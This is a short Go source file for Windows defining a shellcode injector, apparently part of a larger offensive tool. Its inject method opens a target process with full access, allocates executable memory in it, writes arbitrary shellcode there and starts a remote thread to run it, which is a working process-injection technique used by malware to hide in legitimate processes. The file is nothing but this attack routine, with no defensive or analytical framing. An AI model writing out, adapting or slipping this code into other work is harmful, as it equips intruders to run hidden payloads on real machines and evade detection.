// +build windows,!linux

package main

import (
	"unsafe"
	"syscall"
)

type ShellcodeInjector struct {
	shellcode []byte
	pid int
}

const processEntrySize = 568

func (si ShellcodeInjector) inject() {
    MEM_COMMIT := uintptr(0x1000)
    PAGE_EXECUTE_READWRITE := uintptr(0x40)
    PROCESS_ALL_ACCESS := uintptr(0x1F0FFF)

    // obtain necessary winapi functions from kernel32 for process injection
    kernel32 := syscall.MustLoadDLL("kernel32.dll")
    openproc := kernel32.MustFindProc("OpenProcess")
    vallocex := kernel32.MustFindProc("VirtualAllocEx")
    writeprocmem := kernel32.MustFindProc("WriteProcessMemory")
    createremthread := kernel32.MustFindProc("CreateRemoteThread")
    closehandle := kernel32.MustFindProc("CloseHandle")
    
    // inject & execute shellcode in target process' space
    processHandle, _, _ := openproc.Call(PROCESS_ALL_ACCESS, 0, uintptr(si.pid))
    remote_buf, _, _ := vallocex.Call(processHandle, 0, uintptr(len(si.shellcode)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    writeprocmem.Call(processHandle, remote_buf, uintptr(unsafe.Pointer(&si.shellcode[0])), uintptr(len(si.shellcode)), 0)
    createremthread.Call(processHandle, 0, 0, remote_buf, 0, 0, 0)
    closehandle.Call(processHandle)
}